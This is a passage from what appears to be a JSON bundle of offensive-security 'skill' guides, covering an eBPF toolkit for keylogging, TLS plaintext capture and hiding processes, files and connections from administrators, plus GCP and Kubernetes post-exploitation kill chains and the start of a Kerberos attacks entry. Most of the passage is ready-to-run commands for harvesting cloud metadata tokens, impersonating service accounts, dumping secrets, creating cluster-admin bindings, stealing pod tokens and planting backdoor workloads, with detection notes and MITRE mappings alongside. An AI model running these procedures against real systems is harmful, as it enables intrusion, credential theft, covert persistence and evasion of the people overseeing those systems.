<code>SSL_write</code> and <code>SSL_read</code> in <code>libssl.so</code>. Data is captured in plaintext before encryption (write) and after decryption (read). Use <code>--pid</code> to target a specific process (e.g., a web application handling API keys).</p><p><strong>Keystroke logging</strong> hooks <code>sys_read</code> on TTY file descriptors (<code>/dev/tty*</code>, <code>/dev/pts/*</code>). Captures all interactive terminal input including passwords typed in non-echo mode.</p><h4 class=\"mh\">Phase 3 — Stealth Operations</h4><p>Hide your presence from system administrators and monitoring tools.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Hide process</td><td><code>ebpf proc_hide --pid &lt;PID&gt;</code></td><td>Remove process from ps, top, htop, /proc listing</td></tr><tr><td>Hide files</td><td><code>ebpf file_hide --name &lt;NAME&gt;</code></td><td>Remove file/directory from ls, find, directory listings</td></tr><tr><td>Hide connections</td><td><code>ebpf conn_hide --port &lt;PORT&gt;</code></td><td>Remove network connection from netstat, ss, /proc/net/tcp</td></tr></tbody></table></div><p><strong>Process hiding</strong> hooks <code>sys_getdents64</code> on <code>/proc</code>. When the kernel returns directory entries, entries matching the target PID are overwritten with <code>.</code> — the process becomes invisible to all userland tools that enumerate <code>/proc</code>.</p><p><strong>File hiding</strong> uses the same <code>sys_getdents64</code> hook but matches against a filename instead of a PID. Effective for hiding implants, scripts, and data exfiltration staging directories.</p><p><strong>Connection hiding</strong> hooks <code>sys_read</code> on <code>/proc/net/tcp</code> and <code>/proc/net/tcp6</code>. When a monitoring tool reads the connection table, lines containing the target port are overwritten with spaces.</p><h4 class=\"mh\">Phase 4 — Blind Spot Detection (20 monitors)</h4><p>Detect attack primitives that bypass classical syscall hooks and operate through kernel subsystems invisible to standard monitoring.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>io_uring bypass</td><td><code>ebpf io_uring_sniff --duration 60</code></td><td>Detect file/socket/connect operations via io_uring that bypass syscall hooks (kernel 5.1+)</td></tr><tr><td>Fileless execution</td><td><code>ebpf memfd_exec --duration 60</code></td><td>Detect memfd_create + execveat diskless payload delivery chains</td></tr><tr><td>ptrace injection</td><td><code>ebpf ptrace_sniff --duration 60</code></td><td>Monitor ATTACH → POKEDATA → SETREGS shellcode injection sequences</td></tr><tr><td>Cross-process memory</td><td><code>ebpf crossmem_sniff --duration 60</code></td><td>Detect stealthy process_vm_writev/readv memory injection</td></tr><tr><td>Race condition exploits</td><td><code>ebpf userfaultfd_sniff --duration 60</code></td><td>Detect userfaultfd-based timing control primitives</td></tr><tr><td>BPF integrity</td><td><code>ebpf bpf_integrity --baseline --duration 300</code></td><td>Verify CyberStrike hook integrity, detect unauthorized BPF program loads</td></tr><tr><td>Netlink manipulation</td><td><code>ebpf netlink_sniff --duration 60</code></td><td>Detect stealthy route/firewall rule manipulation via netlink</td></tr><tr><td>Sandbox weakening</td><td><code>ebpf seccomp_sniff --duration 60</code></td><td>Detect processes disabling their own seccomp/prctl security profiles</td></tr><tr><td>Shared memory IPC</td><td><code>ebpf mmap_sniff --duration 60</code></td><td>Detect covert IPC via mmap MAP_SHARED, shmget, shmat — data flows without syscalls</td></tr><tr><td>Zero-copy transfers</td><td><code>ebpf zerocopy_sniff --duration 60</code></td><td>Detect splice/tee/sendfile64 fd-to-fd transfers invisible to buffer profilers</td></tr><tr><td>VDSO tampering</td><td><code>ebpf vdso_sniff --duration 60</code></td><td>Detect timing side-channels and VDSO page modification attacks</td></tr><tr><td>Kernel keyring abuse</td><td><code>ebpf keyring_sniff --duration 60</code></td><td>Detect credential storage in kernel keyring (add_key/keyctl)</td></tr><tr><td>Namespace escape</td><td><code>ebpf namespace_sniff --duration 60</code></td><td>Detect container escape via setns/unshare namespace pivoting</td></tr><tr><td>Terminal injection</td><td><code>ebpf ioctl_sniff --duration 60</code></td><td>Detect TIOCSTI keystroke injection and terminal manipulation</td></tr><tr><td>Mount manipulation</td><td><code>ebpf mount_sniff --duration 60</code></td><td>Detect overlay/bind mounts hiding changes on sensitive paths</td></tr><tr><td>FUSE hijacking</td><td><code>ebpf fuse_sniff --duration 60</code></td><td>Detect userspace filesystem mounting that bypasses kernel VFS</td></tr><tr><td>Perf side-channel</td><td><code>ebpf perf_sniff --duration 60</code></td><td>Detect perf_event_open side-channel attacks via HW counters</td></tr><tr><td>BPF map covert channel</td><td><code>ebpf bpfmap_sniff --duration 60</code></td><td>Detect covert data sharing via BPF map create/update operations</td></tr><tr><td>LD_PRELOAD injection</td><td><code>ebpf ldpreload_sniff --duration 60</code></td><td>Detect library injection via LD_PRELOAD env and ld.so config</td></tr><tr><td>Futex covert channel</td><td><code>ebpf futex_sniff --duration 60</code></td><td>Detect timing-based covert channels via futex WAIT/WAKE</td></tr></tbody></table></div><p><strong>io_uring sniffing</strong> monitors SQE submissions via <code>io_uring_submit_sqe</code> kprobe. Operations like CONNECT, READ, WRITE, OPENAT through io_uring bypass classical syscall hooks entirely — a reverse shell built on io_uring is invisible to execve/connect tracepoints.</p><p><strong>Fileless execution detection</strong> correlates <code>memfd_create</code> → <code>write</code> → <code>execveat(fd, &quot;&quot;, AT_EMPTY_PATH)</code> chains. The payload never touches disk — it exists only in memory via memfd. This is the primary technique for diskless implant delivery.</p><p><strong>ptrace injection monitoring</strong> tracks the ATTACH → POKEDATA → SETREGS → CONT sequence that constitutes shellcode injection. Each ptrace operation is logged with target PID and memory addresses.</p><p><strong>Cross-process memory monitoring</strong> captures <code>process_vm_writev</code>/<code>process_vm_readv</code> syscalls. These enable memory injection without ptrace — bypassing ptrace-based detection entirely.</p><p><strong>userfaultfd monitoring</strong> detects creation of userfaultfd file descriptors. Legitimate use is rare (QEMU/KVM live migration); in exploit context, userfaultfd provides precise timing control for race condition exploitation.</p><p><strong>BPF integrity verification</strong> takes a baseline of loaded BPF programs via <code>bpftool</code> and periodically verifies no CyberStrike programs have been detached or tampered with. Also monitors <code>bpf()</code> syscall for unauthorized program loads.</p><p><strong>Netlink monitoring</strong> captures netlink socket messages for NEWROUTE, DELROUTE, NEWRULE, DELRULE operations — detecting stealthy routing table and firewall rule manipulation.</p><p><strong>Seccomp/prctl monitoring</strong> captures PR_SET_SECCOMP, PR_SET_NO_NEW_PRIVS, PR_SET_NAME, PR_SET_DUMPABLE, and seccomp filter installation — detecting processes weakening their own security profiles or masquerading via name changes.</p><h4 class=\"mh\">Phase 5 — Cleanup (MANDATORY)</h4><p>Always run cleanup before exiting a target.</p><pre class=\"code\" data-lang=bash><code># List all CyberStrike eBPF programs on the system\nebpf cleanup\n\n# Remove all CyberStrike eBPF programs\nebpf cleanup --remove --force\n\n# Dry run — show what would be removed\nebpf cleanup --dry-run</code></pre><p>The cleanup tool uses three detection methods:</p><ol class=\"ml\"><li><code>bpftool prog list</code> — enumerate all loaded BPF programs</li><li><code>/sys/fs/bpf/</code> — check for pinned programs</li><li><code>/sys/kernel/debug/tracing/</code> — check for registered kprobe/uprobe events</li></ol>","n":7872},{"t":"Detection Considerations","h":"<p>eBPF programs are detectable by:</p><ul class=\"ml\"><li><code>bpftool prog list</code> — shows all loaded BPF programs</li><li><code>/sys/kernel/debug/tracing/kprobe_events</code> — shows registered kprobes</li><li><code>/sys/kernel/debug/tracing/uprobe_events</code> — shows registered uprobes</li><li><code>auditd</code> rules on <code>bpf()</code> syscall — <code>auditctl -a always,exit -F arch=b64 -S bpf</code></li><li>EDR agents with BPF LSM hooks (Falco, Tracee, Tetragon)</li></ul>","n":369},{"t":"Program Reference","h":"<div class=\"tw\"><table><thead><tr><th>Program</th><th>Hook Type</th><th>Target</th><th>MITRE ATT&amp;CK</th></tr></thead><tbody><tr><td>pam_sniff</td><td>uprobe</td><td><code>pam_get_authtok</code> in libpam.so</td><td>T1556 — Modify Authentication Process</td></tr><tr><td>ssl_sniff</td><td>uprobe</td><td><code>SSL_write</code>/<code>SSL_read</code> in libssl.so</td><td>T1040 — Network Sniffing</td></tr><tr><td>dep_scan</td><td>procfs</td><td><code>/proc/&lt;pid&gt;/maps</code></td><td>T1518 — Software Discovery</td></tr><tr><td>proc_hide</td><td>kprobe</td><td><code>sys_getdents64</code> on /proc</td><td>T1014 — Rootkit</td></tr><tr><td>file_hide</td><td>kprobe</td><td><code>sys_getdents64</code></td><td>T1014 — Rootkit</td></tr><tr><td>conn_hide</td><td>kprobe</td><td><code>sys_read</code> on /proc/net/tcp</td><td>T1014 — Rootkit</td></tr><tr><td>execve_sniff</td><td>tracepoint</td><td><code>sys_execve</code></td><td>T1057 — Process Discovery</td></tr><tr><td>dns_sniff</td><td>kprobe</td><td><code>udp_sendmsg</code> port 53</td><td>T1071.004 — DNS Application Layer Protocol</td></tr><tr><td>keylog</td><td>kprobe</td><td><code>sys_read</code> on TTY fds</td><td>T1056.001 — Keylogging</td></tr><tr><td>cleanup</td><td>bpftool</td><td>BPF programs/maps</td><td>—</td></tr><tr><td>io_uring_sniff</td><td>kprobe</td><td><code>io_uring_submit_sqe</code></td><td>T1014 — Rootkit (syscall bypass)</td></tr><tr><td>memfd_exec</td><td>tracepoint</td><td><code>memfd_create</code> + <code>execveat</code></td><td>T1620 — Reflective Code Loading</td></tr><tr><td>ptrace_sniff</td><td>tracepoint</td><td><code>sys_enter_ptrace</code></td><td>T1055.008 — Ptrace System Calls</td></tr><tr><td>crossmem_sniff</td><td>tracepoint</td><td><code>process_vm_writev</code>/<code>readv</code></td><td>T1055.012 — Process Hollowing</td></tr><tr><td>userfaultfd_sniff</td><td>tracepoint</td><td><code>sys_enter_userfaultfd</code></td><td>T1068 — Exploitation for Privilege Escalation</td></tr><tr><td>bpf_integrity</td><td>tracepoint</td><td><code>sys_enter_bpf</code> + bpftool</td><td>T1553 — Subvert Trust Controls</td></tr><tr><td>netlink_sniff</td><td>kprobe</td><td><code>netlink_sendmsg</code></td><td>T1562.004 — Disable or Modify System Firewall</td></tr><tr><td>seccomp_sniff</td><td>tracepoint</td><td><code>sys_enter_prctl</code> + <code>sys_enter_seccomp</code></td><td>T1562.001 — Disable or Modify Tools</td></tr><tr><td>mmap_sniff</td><td>tracepoint</td><td><code>sys_enter_mmap</code> + <code>sys_enter_shmget</code> + <code>sys_enter_shmat</code></td><td>T1055.009 — Proc Memory (shared memory IPC)</td></tr><tr><td>zerocopy_sniff</td><td>tracepoint</td><td><code>sys_enter_splice</code> + <code>sys_enter_tee</code> + <code>sys_enter_sendfile64</code></td><td>T1041 — Exfiltration Over C2 Channel</td></tr><tr><td>vdso_sniff</td><td>tracepoint</td><td><code>sys_enter_clock_gettime</code> + <code>sys_enter_mprotect</code></td><td>T1497.003 — Time Based Evasion</td></tr><tr><td>keyring_sniff</td><td>tracepoint</td><td><code>sys_enter_add_key</code> + <code>sys_enter_keyctl</code> + <code>sys_enter_request_key</code></td><td>T1003 — OS Credential Dumping</td></tr><tr><td>namespace_sniff</td><td>tracepoint</td><td><code>sys_enter_setns</code> + <code>sys_enter_unshare</code></td><td>T1611 — Escape to Host</td></tr><tr><td>ioctl_sniff</td><td>tracepoint</td><td><code>sys_enter_ioctl</code> (TIOCSTI/TIOCLINUX/TIOCSCTTY)</td><td>T1056.001 — Keylogging</td></tr><tr><td>mount_sniff</td><td>tracepoint</td><td><code>sys_enter_mount</code> + <code>sys_enter_umount</code></td><td>T1006 — Direct Volume Access</td></tr><tr><td>fuse_sniff</td><td>tracepoint</td><td><code>sys_enter_openat</code> (/dev/fuse) + <code>sys_enter_mount</code> (fuse)</td><td>T1014 — Rootkit</td></tr><tr><td>perf_sniff</td><td>tracepoint</td><td><code>sys_enter_perf_event_open</code></td><td>T1497.003 — Time Based Evasion</td></tr><tr><td>bpfmap_sniff</td><td>tracepoint</td><td><code>sys_enter_bpf</code> (MAP_CREATE/UPDATE/LOOKUP/DELETE)</td><td>T1071 — Application Layer Protocol</td></tr><tr><td>ldpreload_sniff</td><td>tracepoint</td><td><code>sys_enter_execve</code> (env scan) + <code>sys_enter_openat</code> (ld.so)</td><td>T1574.006 — Dynamic Linker Hijacking</td></tr><tr><td>futex_sniff</td><td>tracepoint</td><td><code>sys_enter_futex</code> (WAIT/WAKE/BITSET/PI)</td><td>T1029 — Scheduled Transfer</td></tr></tbody></table></div>","n":2964}],"m":{"name":12,"desc":377,"body":12270,"file":12829,"dband":"optimal","bband":"over","ceil":{"desc":{"lim":1024,"pct":36.8},"name":{"lim":64,"pct":18.8}}}},"gcp-postexploit":{"slug":"gcp-postexploit","pillar":"operators","name":"gcp-postexploit","description":"Run a GCP project from credentials already held — enumerate project IAM bindings and enabled services, escalate by service-account impersonation and binding abuse, pull Cloud Storage, Secret Manager and BigQuery data, persist through service-account keys, and read what Cloud Audit Logs captures. Reach for it with a gcloud login, a service-account key file or a metadata-server token.","family":"cloud-postexploit","ported":false,"source":null,"summary":"GCP post-exploitation uses the `gcloud` CLI, `gsutil`, `bq`, and direct metadata-server access for project enumeration, privilege escalation, secret extraction, and persistence. After compromising GCP credentials or gaining access to a Compute Engine instance, these tools provide comprehensive exploitation of the IAM, data, and compute surface. The binding document in GCP is the IAM policy: `roles/` bindings on a project or service account decide what any principal can do, so enumeration of bindings is the first move and everything else follows from what they allow.","file":"acordia-operators/skills/gcp-postexploit/SKILL.md","used_by":["cloud-security"],"intro":"<p># GCP Post-Exploitation Methodology</p><p>GCP post-exploitation uses the <code>gcloud</code> CLI, <code>gsutil</code>, <code>bq</code>, and direct metadata-server access for project enumeration, privilege escalation, secret extraction, and persistence. After compromising GCP credentials or gaining access to a Compute Engine instance, these tools provide comprehensive exploitation of the IAM, data, and compute surface. The binding document in GCP is the IAM policy: <code>roles/</code> bindings on a project or service account decide what any principal can do, so enumeration of bindings is the first move and everything else follows from what they allow.</p>","secs":[{"t":"Prerequisites","h":"<ol class=\"ml\"><li><strong>Valid GCP credentials</strong> — user account, service-account key file, or a token harvested from the metadata server</li><li><strong>gcloud CLI</strong> — <code>gcloud</code>, <code>gsutil</code>, <code>bq</code> installed and authenticated (<code>gcloud auth list</code>)</li><li><strong>Current identity</strong> — verify access via <code>gcloud auth list</code> and confirm the project with <code>gcloud config get-value project</code></li></ol><pre class=\"code\" data-lang=bash><code># Quick prerequisite check\ngcloud auth list                                        # verify active account\ngcloud config get-value project                         # current project\ncurl -H &quot;Metadata-Flavor: Google&quot; \\\n  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \\\n  2&gt;/dev/null &amp;&amp; echo &quot;metadata server available&quot;</code></pre>","n":711},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — Situational Awareness</h4><p>Map the project, the identity, and the bindings that matter.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Project inventory</td><td><code>gcloud projects list</code></td><td>List every project the credential can see</td></tr><tr><td>Project IAM policy</td><td><code>gcloud projects get-iam-policy &lt;PROJECT_ID&gt; --format=json</code></td><td>Dump all <code>roles/</code> bindings on the project</td></tr><tr><td>High-priv bindings</td><td><code>gcloud projects get-iam-policy &lt;PROJECT_ID&gt; --flatten=&quot;bindings[].members&quot; --filter=&quot;bindings.role:(roles/owner OR roles/editor)&quot; --format=&quot;table(bindings.role,bindings.members)&quot;</code></td><td>Isolate Owner/Editor bindings — the bindings that matter</td></tr><tr><td>Service-account inventory</td><td><code>gcloud iam service-accounts list --format='table(email,disabled)'</code></td><td>List service accounts, flag enabled ones as impersonation targets</td></tr><tr><td>Metadata token</td><td><code>curl -H &quot;Metadata-Flavor: Google&quot; http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</code></td><td>Harvest the attached service-account token from a compromised instance</td></tr><tr><td>Permission probe</td><td><code>gcloud projects get-iam-policy &lt;PROJECT_ID&gt;</code> then read bindings for the current identity</td><td>Determine what the current identity can actually do</td></tr><tr><td>Network exposure</td><td><code>gcloud compute firewall-rules list --filter=&quot;sourceRanges=('0.0.0.0/0')&quot; --format='table(name,direction,allowed[].map().firewall_rule().list())'</code></td><td>List firewall rules open to the internet</td></tr></tbody></table></div><h4 class=\"mh\">Phase 2 — Privilege Escalation</h4><p>Exploit IAM misconfigurations to run as a more privileged service account.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Impersonation grant</td><td><code>gcloud iam service-accounts add-iam-policy-binding &lt;SA_EMAIL&gt; --member=&quot;user:&lt;USER&gt;&quot; --role=&quot;roles/iam.serviceAccountTokenCreator&quot;</code></td><td>Grant TokenCreator on a service account, then mint its tokens</td></tr><tr><td>actAs via token mint</td><td><code>gcloud auth print-access-token --impersonate-service-account=&lt;SA_EMAIL&gt;</code></td><td>Mint an access token as the target service account</td></tr><tr><td>Custom-role abuse</td><td><code>gcloud iam roles update &lt;ROLE_ID&gt; --project=&lt;PROJECT_ID&gt; --add-permissions=&lt;PERM&gt;</code></td><td>Add permissions to an existing custom role</td></tr><tr><td>Compute deployment</td><td><code>gcloud compute instances create &lt;NAME&gt; --zone=&lt;ZONE&gt; --service-account=&lt;SA_EMAIL&gt; --scopes=cloud-platform</code></td><td>Launch a VM running as a more privileged service account, then read the metadata token</td></tr><tr><td>Cloud Functions deploy</td><td><code>gcloud functions deploy &lt;NAME&gt; --service-account=&lt;SA_EMAIL&gt;</code></td><td>Deploy a function running as a privileged service account</td></tr><tr><td>Cloud Build submit</td><td><code>gcloud builds submit</code></td><td>Run a build as the Cloud Build service account</td></tr></tbody></table></div><h4 class=\"mh\">Phase 3 — Data Exfiltration</h4><p>Extract data and secrets from the GCP services the identity can reach.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Secret Manager</td><td><code>gcloud secrets list</code> then <code>gcloud secrets versions access latest --secret=&lt;NAME&gt;</code></td><td>Enumerate and read Secret Manager values</td></tr><tr><td>Cloud SQL</td><td><code>gcloud sql instances list</code></td><td>Enumerate Cloud SQL instances</td></tr><tr><td>BigQuery</td><td><code>bq ls</code> then <code>bq show &lt;PROJECT&gt;:&lt;DATASET&gt;.&lt;TABLE&gt;</code></td><td>Enumerate datasets and table schemas</td></tr><tr><td>Storage buckets</td><td><code>gcloud storage ls</code></td><td>List buckets in the project</td></tr><tr><td>Public bucket check</td><td>`gsutil iam get gs://&lt;BUCKET&gt; \\</td><td>grep -E '(allUsers\\</td><td>allAuthenticatedUsers)'`</td><td>Flag bucket IAM bindings granting public access</td></tr></tbody></table></div><h4 class=\"mh\">Phase 4 — Persistence</h4><p>Establish durable access to the GCP environment.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>SA key creation</td><td><code>gcloud iam service-accounts keys create key.json --iam-account=&lt;SA_EMAIL&gt;</code></td><td>Mint a long-lived service-account key for offline use</td></tr><tr><td>IAM binding</td><td><code>gcloud projects add-iam-policy-binding &lt;PROJECT_ID&gt; --member=&quot;user:&lt;USER&gt;&quot; --role=&quot;roles/editor&quot;</code></td><td>Bind a durable role to a principal you control</td></tr><tr><td>Scheduled job</td><td><code>gcloud scheduler jobs create http &lt;NAME&gt; --schedule=&quot;&lt;CRON&gt;&quot; --uri=&quot;&lt;URL&gt;&quot; --oidc-service-account-email=&lt;SA_EMAIL&gt;</code></td><td>Schedule an HTTP job running as a service account</td></tr><tr><td>Function backdoor</td><td><code>gcloud functions deploy &lt;NAME&gt; --service-account=&lt;SA_EMAIL&gt;</code></td><td>Deploy a function that executes as a privileged service account</td></tr></tbody></table></div><h4 class=\"mh\">Phase 5 — Operational Security</h4><p>Understand what is recorded before acting, because GCP does not log everything.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Log sinks</td><td><code>gcloud logging sinks list</code></td><td>Check whether audit logs are exported off-project</td></tr><tr><td>Read audit logs</td><td><code>gcloud logging read 'protoPayload.methodName=&quot;&lt;METHOD&gt;&quot;' --project=&lt;PROJECT_ID&gt;</code></td><td>Confirm what a given action writes to the log</td></tr></tbody></table></div><h4 class=\"mh\">Phase 6 — Cleanup (MANDATORY)</h4><pre class=\"code\"><code>reverse every persistence action: delete service-account keys, remove added IAM bindings, delete scheduler jobs and functions created</code></pre>","n":4718},{"t":"Detection Considerations","h":"<p>Cloud Audit Logs are the primary detection surface, and their coverage is split in two:</p><ul class=\"ml\"><li><strong>Admin Activity audit logs</strong> — always on, cannot be disabled, and free. They record every API call that modifies configuration or metadata: IAM policy changes, service-account key creation, instance creation, function deployment, scheduler job creation, sink modification. Every escalation and persistence action in Phases 2 and 4 lands here.</li><li><strong>Data Access audit logs</strong> — disabled by default for most services because of volume, and must be explicitly enabled. They record reads of resource data: Secret Manager <code>secrets.versions.access</code>, Cloud Storage object reads, BigQuery query jobs, Cloud SQL connections. The exception is BigQuery, whose Data Access logs are always on.</li><li><strong>Log sinks</strong> — <code>gcloud logging sinks list</code> shows whether logs are exported out of the project; a missing sink means logs stay in the project's default <code>_Default</code> and <code>_Required</code> buckets.</li></ul><p>Because Admin Activity logs cannot be turned off, the privilege-escalation and persistence steps are recorded whatever the operator does. The data-access steps are recorded only where the project has enabled Data Access logs — which by default means BigQuery only.</p>","n":1225},{"t":"Program Reference","h":"<div class=\"tw\"><table><thead><tr><th>Program</th><th>Technique</th><th>MITRE ATT&amp;CK</th></tr></thead><tbody><tr><td>gcp_enum</td><td>Project and IAM enumeration</td><td>T1087.004 — Cloud Account</td></tr><tr><td>sa_impersonate</td><td>Service-account impersonation and actAs</td><td>T1098.001 — Additional Cloud Credentials</td></tr><tr><td>iam_binding_abuse</td><td>IAM binding and custom-role escalation</td><td>T1098 — Account Manipulation</td></tr><tr><td>secrets_dump</td><td>Secret Manager extraction</td><td>T1555.006 — Cloud Secrets Management Stores</td></tr><tr><td>storage_dump</td><td>Cloud Storage data exfiltration</td><td>T1530 — Data from Cloud Storage</td></tr><tr><td>bq_access</td><td>BigQuery dataset access</td><td>T1530 — Data from Cloud Storage</td></tr><tr><td>metadata_harvest</td><td>Metadata-server token harvest</td><td>T1552.005 — Cloud Instance Metadata API</td></tr><tr><td>sa_key_persist</td><td>Service-account key persistence</td><td>T1098.001 — Additional Cloud Credentials</td></tr><tr><td>scheduler_backdoor</td><td>Cloud Scheduler / Functions persistence</td><td>T1053 — Scheduled Task/Job</td></tr><tr><td>cleanup_gcp</td><td>Resource removal and restoration</td><td>T1070 — Indicator Removal</td></tr></tbody></table></div>","n":961}],"m":{"name":15,"desc":385,"body":8324,"file":8805,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":37.6},"name":{"lim":64,"pct":23.4}}}},"k8s-postexploit":{"slug":"k8s-postexploit","pillar":"operators","name":"k8s-postexploit","description":"Work a Kubernetes cluster from the inside — enumerate RBAC, anonymous access and privileged workloads, read service-account tokens and namespace secrets, escape a pod by hostPath mount, host namespace or node kubelet, and persist as a workload or a binding. Reach for it with a pod foothold or any usable kubeconfig.","family":"cloud-postexploit","ported":true,"source":".cyberstrike/skill/k8s-postexploit/SKILL.md","summary":"Kubernetes post-exploitation targets cluster resources, RBAC misconfigurations, container security boundaries, and etcd for secret extraction. After compromising a pod or obtaining kubeconfig, these tools provide cluster enumeration, privilege escalation, container escape, and persistent access.","file":"acordia-operators/skills/k8s-postexploit/SKILL.md","used_by":["cloud-security","internal-network"],"intro":"<p># Kubernetes Post-Exploitation Methodology</p><p>Kubernetes post-exploitation targets cluster resources, RBAC misconfigurations, container security boundaries, and etcd for secret extraction. After compromising a pod or obtaining kubeconfig, these tools provide cluster enumeration, privilege escalation, container escape, and persistent access.</p>","secs":[{"t":"Prerequisites","h":"<ol class=\"ml\"><li><strong>Kubernetes access</strong> — kubeconfig file, service account token, or in-cluster config</li><li><strong>Python packages</strong> — <code>pip3 install kubernetes etcd3</code></li><li><strong>Current context</strong> — verify access via <code>kubectl auth can-i --list</code></li></ol><pre class=\"code\" data-lang=bash><code># Quick prerequisite check\nkubectl cluster-info                          # verify cluster access\nkubectl auth can-i --list                     # check current permissions\npython3 -c &quot;from kubernetes import client; print('OK')&quot;</code></pre>","n":455},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — Cluster Enumeration</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Full enumeration</td><td><code>kubectl get ns,pods,svc,ingress,clusterroles,clusterrolebindings --all-namespaces -o wide</code></td><td>Map namespaces, pods, services, RBAC, ingress</td></tr><tr><td>Secret metadata</td><td><code>kubectl get pods,secrets,configmaps -n kube-system -o wide</code></td><td>Focus on high-value system namespace</td></tr></tbody></table></div><p><strong>Anonymous access, privileged pods and node-escape vectors:</strong></p><pre class=\"code\" data-lang=bash><code># Anonymous access\nkubectl auth can-i --list --as=system:anonymous\n\n# Cluster-admin bindings\nkubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name==&quot;system:anonymous&quot;) | .metadata.name'\n\n# Privileged pods\nkubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {ns:.metadata.namespace,name:.metadata.name}'\n\n# hostPath mounts (node escape vector)\nkubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath) | {ns:.metadata.namespace,name:.metadata.name}'\n\n# Benchmark\nkube-bench run --targets=master,node</code></pre><h4 class=\"mh\">Phase 2 — Secret Extraction</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>K8s Secrets</td><td>`kubectl get secrets --all-namespaces -o json</td><td>decode .data base64 values`</td><td>Extract and decode all Kubernetes Secrets</td></tr><tr><td>etcd dump</td><td><code>etcdctl get '' --prefix --endpoints=ENDPOINT (requires certs)</code></td><td>Direct etcd access for all secrets</td></tr></tbody></table></div><h4 class=\"mh\">Phase 3 — Privilege Escalation</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Container escape</td><td><code>check for privileged containers, hostPID/hostNetwork, docker.sock mounts, writable hostPath</code></td><td>Detect escape vectors (privileged, hostPID, docker socket)</td></tr><tr><td>RBAC abuse</td><td><code>kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=NAMESPACE:SA</code></td><td>Create ClusterRoleBinding for cluster-admin</td></tr><tr><td>SA token theft</td><td><code>kubectl exec -it POD -- cat /var/run/secrets/kubernetes.io/serviceaccount/token</code></td><td>Steal service account tokens from pods</td></tr></tbody></table></div><h4 class=\"mh\">Phase 4 — Persistence</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>DaemonSet backdoor</td><td><code>kubectl apply -f daemonset-backdoor.yaml (hostNetwork, hostPID, privileged)</code></td><td>Deploy on every node</td></tr><tr><td>CronJob backdoor</td><td><code>kubectl apply -f cronjob-backdoor.yaml (periodic callback)</code></td><td>Periodic callback</td></tr></tbody></table></div><h4 class=\"mh\">Phase 5 — Cleanup (MANDATORY)</h4><pre class=\"code\"><code>kubectl delete daemonset/cronjob backdoors, delete clusterrolebindings, remove created secrets</code></pre>","n":2483},{"t":"Detection Considerations","h":"<ul class=\"ml\"><li><strong>Kubernetes Audit Logs</strong> — API server audit logging captures all requests</li><li><strong>Falco</strong> — Runtime security monitoring for container escape, privilege escalation</li><li><strong>OPA/Gatekeeper</strong> — Policy enforcement for pod security, RBAC constraints</li><li><strong>Network Policies</strong> — Restricts pod-to-pod and pod-to-external communication</li><li><strong>RBAC Analyzer</strong> — Tools like rbac-police, kubectl-who-can detect dangerous bindings</li></ul>","n":406},{"t":"Program Reference","h":"<div class=\"tw\"><table><thead><tr><th>Program</th><th>Technique</th><th>MITRE ATT&amp;CK</th></tr></thead><tbody><tr><td>k8s_enum</td><td>Cluster resource enumeration</td><td>T1613 — Container and Resource Discovery</td></tr><tr><td>k8s_secrets</td><td>Kubernetes Secret extraction</td><td>T1552.007 — Container API</td></tr><tr><td>k8s_escape</td><td>Container escape exploitation</td><td>T1611 — Escape to Host</td></tr><tr><td>k8s_privesc</td><td>RBAC privilege escalation</td><td>T1078 — Valid Accounts</td></tr><tr><td>etcd_dump</td><td>Direct etcd data extraction</td><td>T1552.007 — Container API</td></tr><tr><td>k8s_backdoor</td><td>DaemonSet/CronJob persistence</td><td>T1053.007 — Container Orchestration Job</td></tr><tr><td>cleanup_k8s</td><td>Resource removal by label selector</td><td>T1070 — Indicator Removal</td></tr></tbody></table></div>","n":625}],"m":{"name":15,"desc":316,"body":4409,"file":4914,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":30.9},"name":{"lim":64,"pct":23.4}}}},"kerberos-attacks":{"slug":"kerberos-attacks","pillar":"operators","name":"kerberos-attacks","description":"Work the Kerberos ticket layer for credentials and impersonation — Kerberoast SPN accounts and AS-REP roast preauthentication-disabled ones, crack the resulting hashes, pass-the-ticket and overpass-the-hash from ccache or kirbi material, abuse unconstrained, constrained and resource-based delegation, and forge Golden and Silver tickets. Reach for it when a realm's KDC is reachable.","family":"directory-attack","ported":true,"source":".cyberstrike/skill/kerberos-attacks/SKILL.md","summary":"``` Client                    KDC (DC)                   Service │                         │                          │ │──AS-REQ (username)─────>│                          │ │<─AS-REP (TGT)───────────│                          │ │                         │                          │ │──TGS-REQ (TGT, SPN)────>│                          │ │<─TGS-REP (TGS)──────────│                          │ │                         │                          │ │──AP-REQ (TGS)──────────────────────────────────────>│ │<─AP-REP────────────────────────────────────────────│ ```","file":"acordia-operators/skills/kerberos-attacks/SKILL.md","used_by":[],"intro":"<p># Kerberos Attack Techniques</p>","secs":[{"t":"Kerberos Authentication Flow","h":"<pre 